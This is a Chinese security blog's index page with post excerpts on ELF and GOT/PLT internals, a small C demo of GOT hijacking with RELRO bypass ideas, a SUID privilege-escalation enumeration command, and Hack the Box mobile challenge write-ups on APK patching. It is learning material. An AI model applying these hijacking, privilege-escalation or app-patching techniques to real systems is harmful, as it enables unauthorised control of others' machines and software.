+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20220424165939270.png" alt="image-20220424165939270"></p>
+<p>调用约定</p>
+<ul>
+<li>x86（32位）cdecl调用约定<ul>
+<li>栈传递参数</li>
+<li>使用寄存器%eax保存返回值</li>
+</ul>
+</li>
+<li>amd64（64位置）cdecl调用约定<ul>
+<li>使用寄存器%rdi，%rsi，%rdx，%rcx，%r8，%r9来传递前6个参数</li>
+<li>第七个之后的参数通过栈来传递</li>
+</ul>
+</li>
+<li>栈帧指针%ebp（%rbp）的用途<ul>
+<li>索引栈上的参数</li>
+<li>保存栈顶位置</li>
+</ul>
+</li>
+<li><input checked disabled type="checkbox"> <font color="red">关于Linux进程内存布局，这里贴几张图：</font><ul>
+<li><a target="_blank" rel="noopener" href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/">https://manybutfinite.com/post/anatomy-of-a-program-in-memory/</a> </li>
+<li><a target="_blank" rel="noopener" href="http://wangxuemin.github.io/2015/07/30/LINUX%E7%A8%8B%E5%BA%8F(%E8%BF%9B%E7%A8%8B)%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%B8%83%E5%B1%80/">http://wangxuemin.github.io/2015/07/30/LINUX%E7%A8%8B%E5%BA%8F(%E8%BF%9B%E7%A8%8B)%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%B8%83%E5%B1%80/</a></li>
+</ul>
+</li>
+</ul>
+<p><strong>32位系统进程虚拟内存布局</strong></p>
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/linux_process_mem-1.png" alt="img"></p>
+<p><strong>进程切换用户空间地址空间变化</strong></p>
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/linux_process_mem-2.png" alt="img"></p>
+<p><strong>一个标准的进程内存空间布局</strong></p>
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/linux_process_mem-3.png" alt="img"></p>
+<p><strong>堆内存</strong></p>
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/linux_process_mem-4.png" alt="img"></p>
+<p><strong>内存映射</strong></p>
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/linux_process_mem-5.png" alt="img"></p>
+<h2 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1u54y1Q7qf?t=22.2">https://www.bilibili.com/video/BV1u54y1Q7qf?t=22.2</a></p>
+<ul>
+<li>Linux可执行文件、对象、共享库文件格式<ul>
+<li>可执行文件：必须包含Segment</li>
+<li>对象文件（*.o）：需要与其他对象链接，必须包含Section</li>
+<li>动态库（*.so）：Segment与Section都必须包含</li>
+</ul>
+</li>
+<li>内核代码：fs/binfmt_elf.c</li>
+<li>Segment和Section<ul>
+<li><strong>相同权限的Section放入同一个Segment。.text、.rodata</strong></li>
+<li><strong>一个Segment包含许多Section，一个Section可以属于多个Segment</strong></li>
+</ul>
+</li>
+<li>Segment<ul>
+<li>内核在执行ELF文件时如何映射内存</li>
+<li>Segment主要包含加载地址、文件中的范围、内存权限、对齐方式</li>
+<li>运行时必要的信息</li>
+</ul>
+</li>
+<li>Section<ul>
+<li>用于高速链接器，ELF格式、哪里是代码、哪里是只读数据、哪里是重定位信息</li>
+<li>每个Section包含Section类型、文件中的位置、大小等信息</li>
+<li>链接器依赖Section信息将不同的对象文件的代码、数据信息合并，并修复互相引用</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20220424222910406.png" alt="image-20220424222910406"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ELF Header:</span><br><span class="line">giantbranch@ubuntu:~/demo$ readelf -h a.out </span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              EXEC (Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x4004e0</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          6736 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         9</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         31</span><br><span class="line">  Section header string table index: 28</span><br><span class="line">  </span><br><span class="line">program headers:</span><br><span class="line">giantbranch@ubuntu:~/demo$ readelf -l a.out </span><br><span class="line"></span><br><span class="line">Elf file type is EXEC (Executable file)</span><br><span class="line">Entry point 0x4004e0</span><br><span class="line">There are 9 program headers, starting at offset 64</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040</span><br><span class="line">                 0x00000000000001f8 0x00000000000001f8  R E    8</span><br><span class="line">  INTERP         0x0000000000000238 0x0000000000400238 0x0000000000400238</span><br><span class="line">                 0x000000000000001c 0x000000000000001c  R      1</span><br><span class="line">      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]</span><br><span class="line">  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000</span><br><span class="line">                 0x000000000000082c 0x000000000000082c  R E    200000</span><br><span class="line">  LOAD           0x0000000000000e10 0x0000000000600e10 0x0000000000600e10</span><br><span class="line">                 0x0000000000000238 0x0000000000000240  RW     200000</span><br><span class="line">  DYNAMIC        0x0000000000000e28 0x0000000000600e28 0x0000000000600e28</span><br><span class="line">                 0x00000000000001d0 0x00000000000001d0  RW     8</span><br><span class="line">  NOTE           0x0000000000000254 0x0000000000400254 0x0000000000400254</span><br><span class="line">                 0x0000000000000044 0x0000000000000044  R      4</span><br><span class="line">  GNU_EH_FRAME   0x0000000000000704 0x0000000000400704 0x0000000000400704</span><br><span class="line">                 0x0000000000000034 0x0000000000000034  R      4</span><br><span class="line">  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">                 0x0000000000000000 0x0000000000000000  RW     10</span><br><span class="line">  GNU_RELRO      0x0000000000000e10 0x0000000000600e10 0x0000000000600e10</span><br><span class="line">                 0x00000000000001f0 0x00000000000001f0  R      1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00     </span><br><span class="line">   01     .interp </span><br><span class="line">   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame </span><br><span class="line">   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss </span><br><span class="line">   04     .dynamic </span><br><span class="line">   05     .note.ABI-tag .note.gnu.build-id </span><br><span class="line">   06     .eh_frame_hdr </span><br><span class="line">   07     </span><br><span class="line">   08     .init_array .fini_array .jcr .dynamic .got </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><input disabled type="checkbox"> <font color="red"><strong>程序的装载过程</strong></font></li>
+</ul>
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20220424230146032.png" alt="image-20220424230146032"></p>
+<p><strong>/proc/pid/maps 查看内存映射</strong></p>
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20220424230734877.png" alt="image-20220424230734877"></p>
+<h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><ul>
+<li>一种运行时加载和链接共享库的技术</li>
+<li>Linux常见libc</li>
+</ul>
+<p>重定位（Relocations），对于二进制中待填充项</p>
+<p>动态链接中的延迟绑定</p>
+<ul>
+<li>外部函数的地址在运行时才确认</li>
+<li>外部函数的符号首次调用时才解析</li>
+<li>外部变量不使用延迟绑定</li>
+</ul>
+<p><strong>GOT表：Global Offset Table</strong></p>
+<ul>
+<li>用于存放外部函数或外部变量地址</li>
+<li>GOT表初始项指向一段<strong>PLT</strong>（过程链接表，Procedure Linkage Table）代码</li>
+<li>当库函数被首次调用，真正的函数地址被解析并填入相应的GOT表项</li>
+<li>每个外部函数均有一段PLT代码</li>
+</ul>
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20220503131640696.png" alt="image-20220503131640696"></p>
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20220503132018632.png" alt="image-20220503132018632"></p>
+<p>查看GOT表项</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/demo_me/hello$ objdump -R a.out </span><br><span class="line"></span><br><span class="line">a.out:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>
+
+<p><strong>GOT表劫持</strong></p>
+<p>如下，一个劫持printf函数到指定的win函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;You Win!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> addr,value;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%x=%x&quot;</span>, &amp;addr, &amp;value);</span><br><span class="line">	*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)addr = value;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;set %x=%x\n&quot;</span>, addr,value);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20220503144817432.png" alt="image-20220503144817432"></p>
+<p>缓解措施</p>
+<p><strong>重定位只读</strong>，gcc -z,relro，在程序进入main()前，所有外部函数都会解析，全部设置为只读。</p>
+<p>绕过</p>
+<ul>
+<li>劫持开启该功能的动态库的GOT表，例如：libc</li>
+<li>修改返回地址</li>
+</ul>
+<h2 id="二进制漏洞"><a href="#二进制漏洞" class="headerlink" title="二进制漏洞"></a>二进制漏洞</h2><ul>
+<li><input disabled type="checkbox"> 栈溢出</li>
+<li><input disabled type="checkbox"> 堆溢出</li>
+<li><input disabled type="checkbox"> 整数溢出</li>
+<li><input disabled type="checkbox"> …</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/19/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="尘埃落定">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="尘埃落定的空间站">
+      <meta itemprop="description" content="Stay Hungry, Stay Foolish.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 尘埃落定的空间站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/19/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">Linux提权总结</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-04-19 05:44:02 / 修改时间：06:30:26" itemprop="dateCreated datePublished" datetime="2022-04-19T05:44:02+08:00">2022-04-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>在b站上看到了一个关于提权的视频，主要分为非漏洞提权与漏洞提提权：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1QS4y1277a?p=2&amp;spm_id_from=pageDriver">https://www.bilibili.com/video/BV1QS4y1277a?p=2&amp;spm_id_from=pageDriver</a></p>
+<h2 id="非漏洞提权"><a href="#非漏洞提权" class="headerlink" title="非漏洞提权"></a>非漏洞提权</h2><h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p>SUID：<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution</p>
+<ul>
+<li>SUID权限只能设置二进制文件</li>
+<li>执行者要有二进制文件的执行权</li>
+<li>执行时会获得该程序的属主身份</li>
+<li>SUID权限只在执行过程中有效</li>
+</ul>
+<p>查找SUID权限程序：<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<p>Linux平台SUID提权：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/#+suid%EF%BC%8C%E8%BF%99%E9%87%8C%E8%AF%B4%E6%98%8E%E4%B8%80%E4%B8%8Bfind%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F">https://gtfobins.github.io/#+suid，这里说明一下find的提权方式</a></p>
+<h2 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h2>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="尘埃落定">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="尘埃落定的空间站">
+      <meta itemprop="description" content="Stay Hungry, Stay Foolish.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 尘埃落定的空间站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/" class="post-title-link" itemprop="url">4月中旬</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-16 19:38:01" itemprop="dateCreated datePublished" datetime="2022-04-16T19:38:01+08:00">2022-04-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-05-03 17:58:56" itemprop="dateModified" datetime="2022-05-03T17:58:56+08:00">2022-05-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="Hack-the-Box"><a href="#Hack-the-Box" class="headerlink" title="Hack the Box"></a>Hack the Box</h3><h4 id="Challenges-Mobile"><a href="#Challenges-Mobile" class="headerlink" title="Challenges-Mobile"></a>Challenges-Mobile</h4><p><strong>Cat</strong></p>
+<p>解压后为一个cat.ab文件。安卓备份文件</p>
+<blockquote>
+<p>.ab文件</p>
+<p><a target="_blank" rel="noopener" href="https://fileinfo.com/extension/ab">https://fileinfo.com/extension/ab</a></p>
+</blockquote>
+<p>如下：开头的Magiccode、备份文件格式版本、是否压缩、是否加密（none or AES-256）</p>
+<p><img src="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/image-20220416201114550.png" alt="image-20220416201114550"></p>
+<p>使用工具进行解析：<a target="_blank" rel="noopener" href="https://github.com/nelenkov/android-backup-extractor">https://github.com/nelenkov/android-backup-extractor</a></p>
+<p>最终的flag在如下图片中：</p>
+<p><img src="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/image-20220416202819088.png" alt="image-20220416202819088"></p>
+<p><strong>Don’t Overreact</strong></p>
+<p>jdax进行反汇编后，在/assets目录发现如下（该题目第一次接触<font color="red"><strong>React Native</strong></font>，从**/assets/index.android.bundle**加载script）</p>
+<p><img src="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/image-20220416203312410.png" alt="image-20220416203312410"></p>
+<p>在线工具查看该字符串：<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
+<p><img src="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/image-20220416203938475.png" alt="image-20220416203938475"></p>
+<p><strong>APKey</strong></p>
+<p><img src="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/image-20220416214925168.png" alt="image-20220416214925168"></p>
+<p>签名工具：apk-singer</p>
+<p>最简单的思路：apktool反编译，修改返回逻辑，重打包签名即可。这里修改if-eqz为if-nez（<strong>cond_1为错误分支</strong>）</p>
+<p><img src="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/image-20220416215103057.png" alt="image-20220416215103057"></p>
+<p><strong>SeeTheSharpFlag</strong></p>
+<p>该apk为x86架构，使用avb进行安装</p>
+<p><img src="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/image-20220417121050575.png" alt="image-20220417121050575"></p>
+<p>此题参考学习：<a target="_blank" rel="noopener" href="https://hackcatml.tistory.com/146">https://hackcatml.tistory.com/146</a></p>
+<p>Xamarin：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/ko-kr/xamarin/get-started/what-is-xamarin">https://docs.microsoft.com/ko-kr/xamarin/get-started/what-is-xamarin</a></p>
+<blockquote>
+<p>Xamarin.Android 应用程序从 C# 编译为<strong>中间语言 (IL)</strong> ，然后在应用程序启动<strong>时即时 (JIT)<strong>编译为本机程序集。Xamarin.Android 应用程序在带有 Android 运行时 (ART) 虚拟机的 Mono 执行环境中运行。Xamarin 提供到 <code>Android.* </code>和 <code>Java.* </code>命名空间的 .NET 绑定。Mono 执行环境通过</strong>Managed Callable Wrappers</strong> (MCW) 调用这些命名空间，<strong>并为 ART 提供 Android Callable Wrappers (ACW)，</strong>以便两个环境可以相互调用代码。</p>
+</blockquote>
+<p><img src="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/android-architecture-cropped.png" alt="Xamarin.Android 架构图"></p>
+<p>如下dll文件：</p>
+<p><img src="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/image-20220417124758037.png" alt="image-20220417124758037"></p>
+<p><img src="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/image-20220417125559842.png" alt="image-20220417125559842"></p>
+<p>该dll使用了lz算法进行压缩，工具解压缩：<a target="_blank" rel="noopener" href="https://github.com/x41sec/tools/blob/master/Mobile/Xamarin/Xamarin_XALZ_decompress.py">https://github.com/x41sec/tools/blob/master/Mobile/Xamarin/Xamarin_XALZ_decompress.py</a></p>
+<p>使用<strong>dnSpy</strong>进行反编译，修改IL指令（.net中间语言）</p>
+<p><img src="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/image-20220417152818535.png" alt="image-20220417152818535"></p>
+<p><img src="/2022/04/16/4%E6%9C%88%E4%B8%AD%E6%97%AC/image-20220417153137612.png" alt="image-20220417153137612"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="尘埃落定">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="尘埃落定的空间站">
+      <meta itemprop="description" content="Stay Hungry, Stay Foolish.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 尘埃落定的空间站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">区块链安全入门笔记</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-07 14:11:55" itemprop="dateCreated datePublished" datetime="2022-04-07T14:11:55+08:00">2022-04-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-04-19 03:05:58" itemprop="dateModified" datetime="2022-04-19T03:05:58+08:00">2022-04-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><strong>区块链安全入门笔记（三）|慢雾科技</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/slowmist/Knowledge-Base/blob/master/blockchain_security_study_notes/03.md">https://github.com/slowmist/Knowledge-Base/blob/master/blockchain_security_study_notes/03.md</a></p>
+<ul>
+<li><input disabled type="checkbox"> 权益证明 PoS</li>
+<li><input disabled type="checkbox"> 委托权益证明 DPoS</li>
+<li><input disabled type="checkbox"> 无利益攻击 Nothing at Stake Attack</li>
+</ul>
+<p><strong>区块链安全入门笔记（四）|慢雾科技</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/slowmist/Knowledge-Base/blob/master/blockchain_security_study_notes/04.md">https://github.com/slowmist/Knowledge-Base/blob/master/blockchain_security_study_notes/04.md</a></p>
+<p><strong>区块链安全入门笔记（五）|慢雾科技</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/slowmist/Knowledge-Base/blob/master/blockchain_security_study_notes/05.md">https://github.com/slowmist/Knowledge-Base/blob/master/blockchain_security_study_notes/05.md</a></p>
+<ul>
+<li><input disabled type="checkbox"> 异形攻击 Alien Attack</li>
+</ul>
+<p><strong>区块链安全入门笔记（六）|慢雾科技</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/slowmist/Knowledge-Base/blob/master/blockchain_security_study_notes/06.md">https://github.com/slowmist/Knowledge-Base/blob/master/blockchain_security_study_notes/06.md</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/31/%E9%A3%9E%E5%87%A1%E6%B1%BD%E8%BD%A6app%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="尘埃落定">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="尘埃落定的空间站">
+      <meta itemprop="description" content="Stay Hungry, Stay Foolish.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 尘埃落定的空间站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/03/31/%E9%A3%9E%E5%87%A1%E6%B1%BD%E8%BD%A6app%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">飞凡汽车app安全测试</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-03-31 13:12:13" itemprop="dateCreated datePublished" datetime="2022-03-31T13:12:13+08:00">2022-03-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-05-04 23:41:01" itemprop="dateModified" datetime="2022-05-04T23:41:01+08:00">2022-05-04</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          有东西被加密了, 请输入密码查看.
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/31/%E9%A3%9E%E5%87%A1%E6%B1%BD%E8%BD%A6app%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="尘埃落定">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="尘埃落定的空间站">
+      <meta itemprop="description" content="Stay Hungry, Stay Foolish.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 尘埃落定的空间站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
